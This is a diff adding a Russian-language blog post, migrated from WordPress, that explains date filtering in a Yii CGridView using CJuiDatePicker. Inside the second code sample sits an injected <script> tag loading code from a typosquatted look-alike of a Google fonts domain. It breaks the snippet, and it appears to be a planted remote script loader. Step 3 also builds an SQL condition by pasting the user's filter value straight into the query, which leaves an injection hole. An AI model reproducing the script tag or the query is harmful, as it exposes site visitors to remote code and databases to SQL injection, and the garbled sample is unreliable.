@@ -1,0 +1,109 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii фильтрация в CGridView при помощи CJuiDatePicker
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1632
+wordpress_url: http://devdocs.ru/partners-news/yii-filtratsiya-v-cgridview-pri-pomoshhi-cjuidatepicker/
+date: '2015-06-03 08:26:18 +0200'
+date_gmt: '2015-06-03 08:26:18 +0200'
+categories:
+- Yii framework
+tags:
+- jquery
+- bootstrap
+- ui
+- des1roer
+- yii1
+- yii
+- yii1-jui
+- orm
+comments: []
+---
+<div dir="ltr" style="text-align: left;">основную идею вынес отсюда1.первоначальный вид столбца меняем с</p>
+<pre><code><br />
+        array(<br />
+            'name' => 'f_timestamp',<br />
+            'type' => 'raw',<br />
+            'value' => '($data->f_timestamp)',<br />
+            'headerHtmlOptions' => array('style' => 'text-align:center'),<br />
+        ),<br />
+<&#47;code><&#47;pre><br />
+на</p>
+<pre><code><br />
+        array(<br />
+            'name' => 'f_timestamp',<br />
+            'filter' => $this->widget('zii.widgets.jui.CJuiDatePicker', array(<br />
+                'model' => $model,<br />
+                'attribute' => 'f_timestamp',<br />
+                'language' => 'ru',<br />
+                'options' => array(<br />
+                    'showAnim' => 'fold',<br />
+                    'dateFormat' => 'yy-mm-dd',<br />
+                    'changeMonth' => 'true',<br />
+                    'changeYear' => 'true',<br />
+                    'showButtonPanel' => 'true',<br />
+                ),<br />
+                    ), true),<br />
+        ),<br />
+<&#47;code><&#47;pre><br />
+2.дописываем</p>
+<pre><code><br />
+$this->widget('bootstrap.widgets.TbGridView', array(<br />
+    'id' => 'level-view-grid',<br />
+    'dataProvider' => $model->search(),<br />
+    'filter' => $model,<br />
+    'afterAjaxUpdate' => "function() {<br />
+        jQuery('#LevelView_f_timestamp').datepicker(jQuery.extend(jQuery.datepicker.regional['ru'],{'showAnim':'fold','dateFormat':'yy-mm-dd','changeMonth':'true','showButtonPanel':'true','changeYear':'true'}));<br />
+    }",<br />
+<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre><br />
+где</p>
+<pre><code><br />
+LevelView_f_timestamp<br />
+<&#47;code><&#47;pre><br />
+id фильтра (узнать можно при помощи firebug)</p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;3.bp.blogspot.com&#47;-j3wXDFc3ACc&#47;VWw53rRInGI&#47;AAAAAAAAAZQ&#47;U8M5dvFwLsY&#47;s1600&#47;Screenshot_27.png"><img src="http:&#47;&#47;3.bp.blogspot.com&#47;-j3wXDFc3ACc&#47;VWw53rRInGI&#47;AAAAAAAAAZQ&#47;U8M5dvFwLsY&#47;s640&#47;Screenshot_27.png" alt="" width="640" height="66" border="0" &#47;><&#47;a><&#47;div><br />
+3.в модели изменяем правило поиска на</p>
+<pre><code><br />
+if ($this->f_timestamp)  $criteria->addCondition ("f_timestamp::date = '$this->f_timestamp'" );<br />
+<&#47;code><&#47;pre><br />
+<span style="color: red;">Это ключевой момент&nbsp; <&#47;span><br />
+<span style="color: red;">Стандартное <i>$criteria->compare<&#47;i> будет искать как <b>LIKE <&#47;b>а нам нужно&nbsp; <&#47;span><br />
+<i><b><span style="color: red;">WHERE f_timestamp::date = '2015-05-28'<&#47;span><&#47;b><&#47;i></p>
+<p>4.после чего можем еще добавить кнопку на очистку фильтра</p>
+<pre><code><br />
+$this->widget('bootstrap.widgets.TbButton', array(<br />
+    'buttonType' => 'button',<br />
+    'label' => 'сбросить время',<br />
+    'htmlOptions' => array('onclick' => "document.getElementById('LevelView_f_timestamp').value=null;location.reload(); "),<br />
+));<br />
+<&#47;code><&#47;pre><br />
+или даже так</p>
+<pre><code><br />
+array(<br />
+    'class' => 'bootstrap.widgets.TbButtonColumn',<br />
+    'header' => CHtml::link('сбросить время', '', array(<br />
+                    'onclick'=>"document.getElementById('LevelView_f_timestamp').value=null;location.reload();",<br />
+                    )<br />
+                ) ,<br />
+<&#47;code><&#47;pre><br />
+или так</p>
+<pre><code><br />
+array(<br />
+    'class' => 'bootstrap.widgets.TbButtonColumn',<br />
+    'header' => CHtml::image(Yii::app()->baseUrl . '&#47;images&#47;icons&#47;mydel.png', '', array(<br />
+                    'onclick'=>"document.getElementById('LevelView_f_timestamp').value=null;location.reload();",<br />
+                    )<br />
+                ) ,<br />
+<&#47;code><&#47;pre></p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-QKw5IY8zPdQ&#47;VWw7NX9aBJI&#47;AAAAAAAAAZc&#47;IY7QG1m5WBo&#47;s1600&#47;Screenshot_1.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-QKw5IY8zPdQ&#47;VWw7NX9aBJI&#47;AAAAAAAAAZc&#47;IY7QG1m5WBo&#47;s400&#47;Screenshot_1.png" alt="" width="400" height="298" border="0" &#47;><&#47;a><&#47;div></p>
+<div class="separator" style="clear: both; text-align: center;"><a style="margin-left: 1em; margin-right: 1em;" href="http:&#47;&#47;4.bp.blogspot.com&#47;-UjZBgsryiE4&#47;VWw7Nfly3ZI&#47;AAAAAAAAAZY&#47;KrEouR2gvJs&#47;s1600&#47;Screenshot_2.png"><img src="http:&#47;&#47;4.bp.blogspot.com&#47;-UjZBgsryiE4&#47;VWw7Nfly3ZI&#47;AAAAAAAAAZY&#47;KrEouR2gvJs&#47;s400&#47;Screenshot_2.png" alt="" width="400" height="247" border="0" &#47;><&#47;a><&#47;div><br />
+<&#47;div><br />
+Source: des1roer.blogspot.com</p>
